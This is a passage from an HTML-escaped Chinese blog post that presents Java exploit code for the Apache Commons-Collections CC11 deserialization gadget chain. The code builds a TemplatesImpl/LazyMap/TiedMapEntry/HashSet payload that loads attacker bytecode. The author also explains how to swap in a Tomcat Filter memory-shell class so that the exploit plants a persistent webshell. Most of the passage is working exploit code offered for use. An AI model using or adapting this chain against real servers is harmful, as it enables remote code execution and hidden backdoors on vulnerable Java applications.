&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">node&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">array&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">node&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">node&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">array&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">keyField&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">node&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;key&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">tiedmap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">keyField&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.util.MapEntry&amp;#34;&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;key&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">keyField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">keyField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">node&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">tiedmap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 替换 防止生成payload的时候就触发rce
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformer&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;iMethodName&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;newTransformer&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">outputStream&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FileOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;./cc11&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">outputStream&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">hashset&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">outputStream&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#111">inputStream&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FileInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;./cc11&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">inputStream&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printStackTrace&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>具体的我就不多分析了，可以近似为CC2+CC6，用TemplatestImpl加载字节码，恶意类由javassist生成&lt;/p>
&lt;p>如何扩展这个看起来只能执行单句指令的简易poc？简单，我们将tomcat Filter内存马部分单独写一份TomcatInject.java文件，替换掉这里的&lt;code>getBytescode&lt;/code>，让它不要自己生成恶意类了，直接读取TomcatInject.class的字节码即可&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">ccTest&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.InvokerTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.keyvalue.TiedMapEntry&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.map.LazyMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashSet&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@SuppressWarnings&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;all&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CC11Template&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">bytes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getBytes&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[][]&lt;/span> &lt;span style="color:#111">targetByteCodes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[][]{&lt;/span>&lt;span style="color:#111">bytes&lt;/span>&lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TemplatesImpl&lt;/span> &lt;span style="color:#111">templates&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">TemplatesImpl&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">f0&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">templates&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;_bytecodes&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f0&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f0&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">templates&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">targetByteCodes&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f0&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">templates&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;_name&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f0&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f0&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">templates&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;name&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f0&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">templates&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;_class&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f0&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f0&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">templates&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 利用反射调用 templates 中的 newTransformer 方法
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span> &lt;span style="color:#111">transformer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;asdfasdfasdf&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">],&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HashMap&lt;/span> &lt;span style="color:#111">innermap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">LazyMap&lt;/span> &lt;span style="color:#111">map&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innermap&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">transformer&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TiedMapEntry&lt;/span> &lt;span style="color:#111">tiedmap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TiedMapEntry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">templates&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HashSet&lt;/span> &lt;span style="color:#111">hashset&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashSet&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">hashset&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;foo&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 我们要设置 HashSet 的 map 为我们的 HashMap
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HashSet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;map&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">NoSuchFieldException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HashSet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;backingMap&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HashMap&lt;/span> &lt;span style="color:#111">hashset_map&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">hashset&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">f2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;table&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">NoSuchFieldException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;elementData&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f2&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">array&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[])&lt;/span>&lt;span style="color:#111">f2&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">hashset_map&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">node&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">array&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">node&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">node&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">array&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">keyField&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">keyField&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">node&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;key&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
